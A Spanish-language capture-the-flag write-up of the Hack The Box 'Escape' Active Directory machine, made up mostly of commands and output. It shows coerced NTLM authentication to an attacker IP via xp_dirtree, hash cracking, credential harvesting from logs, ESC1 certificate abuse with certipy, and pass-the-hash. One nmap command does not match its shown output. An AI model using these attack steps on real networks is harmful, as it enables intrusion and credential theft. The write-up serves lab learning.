# Escape

- **Plataforma:** HTB 
- **Fecha de resolución:** 14/11/2025
- **Autor:** Albr_0x4a

---

## Escaneo de Puertos con Nmap

- **Identificar puertos abiertos:**

- **Comando:** nmap -p- -n -Pn --min-rate 5000 -sS $IP

- **Identificar servicios y versiones en los puertos abiertos:**

- **Comando:** nmap -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,49859 -sCV $IP

```bash
# Nmap 7.94SVN scan initiated Thu Nov 13 12:00:25 2025 as: nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49702,49713,49747 -sCV -n -Pn -oN tcp_target 10.10.11.202
Nmap scan report for 10.10.11.202
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-13 19:00:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-11-13T19:02:03+00:00; +8h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-11-13T19:02:01+00:00; +8h00m00s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-11-13T19:02:03+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-13T18:54:34
|_Not valid after:  2055-11-13T18:54:34
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-13T19:02:03+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-11-13T19:02:01+00:00; +8h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49747/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-13T19:01:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 13 12:02:03 2025 -- 1 IP address (1 host up) scanned in 98.70 seconds
```

## Enumeración

- El escáner de Nmap nos revela un montón de puertos abiertos lo que nos indica que la máquina utiliza Active Directory. También identificamos 2 nombres para esta máquina: `sequel.htb` y `dc.sequel.htb`; que agregamos a nuestro archivo `/etc/hosts`.

- Empezamos enumerando el servicio SMB y nos encontramos que tenemos acceso sin autenticación:

```bash
❯ nxc smb $IP -u "guest" -p "" --shares
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share 
```
- Como podemos observar en la salida anterior tenemos permisos de lectura sobre el share Public, el cual no es estándar. Después de revisar este share, nos encontramos con un archivo `.pdf`, el cual nos descargamos para inspeccionar:
  
```bash
❯ smbclient //$IP/Public -U "guest"
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

                5184255 blocks of size 4096. 1432901 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (95,6 KiloBytes/sec) (average 95,6 KiloBytes/sec)
```

- Al revisar este archivo nos encontramos con credenciales para conectarnos al servidor MSSQL que se encuentra en escucha en el puerto 1433:
  
```text
Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1.
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

## Obteniendo Credenciales Válidas

- Nos conectamos al servidor con las credenciales `PublicUser:GuestUserCantWrite1`:
  
```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> 
```

- Después de enumerar este servidor y no encontrar nada interesante, intentamos forzar al servidor para que se autentique a nuestra máquina para así obtener el hash del usuario bajo el que corre MSSQL:
  - Para ello primero iniciamos `Responder`:
    
    `sudo responder -I tun0`

  - Luego ejecutamos la siguiente consulta SQL:

    `EXEC master..xp_dirtree '\\10.10.14.4\share\'`

- De manera exitosa obtenemos el hash del usuario `sql_svc`:
  
```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:3042a6ef83a90c16:06CB22209045BC972D0603CAFC2FD4A5:010100000000000080384B77E354DC01E5AEC8AA00E6982300000000020008004D00530058004E0001001E00570049004E002D005600380032004B00520042003600590042003500360004003400570049004E002D005600380032004B0052004200360059004200350036002E004D00530058004E002E004C004F00430041004C00030014004D00530058004E002E004C004F00430041004C00050014004D00530058004E002E004C004F00430041004C000700080080384B77E354DC0106000400020000000800300030000000000000000000000000300000EB6B14DD9D2B92F7EB4022DA5F735E8C643BB0B0D096F81780A5BC96B7D083750A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000
 ```

- Ahora podemos proceder a descifrar este hash mediante `hashcat` con el modo `5600`:

```bash
❯ echo "sql_svc::sequel:3042a6ef83a90c16:06CB22209045BC972D0603CAFC2FD4A5:010100000000000080384B77E354DC01E5AEC8AA00E6982300000000020008004D00530058004E0001001E00570049004E002D005600380032004B00520042003600590042003500360004003400570049004E002D005600380032004B0052004200360059004200350036002E004D00530058004E002E004C004F00430041004C00030014004D00530058004E002E004C004F00430041004C00050014004D00530058004E002E004C004F00430041004C000700080080384B77E354DC0106000400020000000800300030000000000000000000000000300000EB6B14DD9D2B92F7EB4022DA5F735E8C643BB0B0D096F81780A5BC96B7D083750A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000" > hash
```
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
```bash
REGGIE1234ronnie
```

- Todo funcionó, y ahora poseemos la contraseña del usuario `sql_svc`, con la cual podemos intentar acceder a la máquina mediante WinRM:
  
```bash
❯ evil-winrm -i $IP -u "sql_svc" -p "REGGIE1234ronnie"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

## Movimiento Lateral

- Logramos acceder a la máquina pero no encontramos la primera flag, lo que nos hace pensar que debemos obtener acceso como otro usuario.
- Al listar el directorio `C:\Users\`, nos encontramos con que existe un usuario `Ryan.Cooper`

```powershell
*Evil-WinRM* PS C:\> ls c:\Users\


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```
- Después de un rato enumerando el sistema, buscamos posibles credenciales almacenadas en texto claro para el usuario `Ryan.Cooper`, y encontramos el archivo `C:\SQLServer\Logs\ERRORLOG.BAK`, el cual contiene posibles credenciales para este usuario:
  
```text
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

- Intentamos conectarnos mediante WinRM con `Ryan.Cooper:NuclearMosquito3` y obtenemos acceso al sistema:

```bash
❯ evil-winrm -i $IP -u "Ryan.Cooper" -p "NuclearMosquito3"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

- Ahora si obtenemos la primera flag, en el escritorio del usuario `Ryan.Cooper`:

```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> ls


    Directory: C:\Users\Ryan.Cooper\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/13/2025  10:54 AM             34 user.txt
```

## Escalando Privilegios

- Ya tenemos acceso con el usuario `Ryan.Cooper`, por lo que nuestro siguiente paso es obtener privilegios administrativos y obtener la última flag.

- Al repasar mis notas, después de un tiempo enumerando sin éxito, llama la atención toda la información relacionada con certificados en la salida del comando de Nmap visto al inicio. Lo que puede indicar el funcionamiento de una autoridad de certificación. 

- Para enumerar en busca de posibles vulnerabilidades en la configuración de ADCS utilizamos la herramienta `certipy`:
  
```bash
certipy find -u "Ryan.Cooper" -p "NuclearMosquito3" -dc-ip $IP -text -vulnerable
```
  
- El comando anterior almacenó toda la información obtenida en un archivo:

```bash
❯ catnp 20251114142840_Certipy.txt
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

- La salida del comando anterior nos muestra la plantilla `UserAuthentication`, que está mal configurada, ya que permite a cualquier usuario del dominio solicitar un certificado valido en nombre de cualquier otro usuario del dominio, incluyendo cuentas de altos privilegios

- Para aprovecharnos de la vulnerabilidad vista anteriormente podemos utilizar nuevamente `certipy` para solicitar un certificado como administrador de la siguiente forma:

```bash
certipy req -u "Ryan.Cooper" -p "NuclearMosquito3" -dc-ip $IP -ca "sequel-DC-CA"  -target "sequel.htb" -upn "administrator@sequel.htb" -template "UserAuthentication"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 19
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

- Una vez obtenido el certificado podemos autenticarnos con este y extraer el hash nt de la cuenta, pero antes para que tenga éxito debemos sincronizar nuestro reloj local con el de la máquina victima de la siguiente forma:

```bash
sudo ntpdate $IP
2025-11-14 22:56:25.989843 (+0100) +28800.764392 +/- 0.049949 10.10.11.202 s1 no-leap
CLOCK: time stepped by 28800.764392
```

- Ahora procedemos a autenticarnos con el certificado:

```bash
❯ certipy auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

- Ahora que tenemos el hash de la cuenta Administrator podemos acceder a la máquina mediante WinRM utilizando este hash y obtener la última flag:

```powershell
❯ evil-winrm -i $IP -u "administrator" -H "a52f78e4c751e5f5e17e1e9f3e58f4ee"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..\desktop\


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/13/2025  10:54 AM             34 root.txt
```
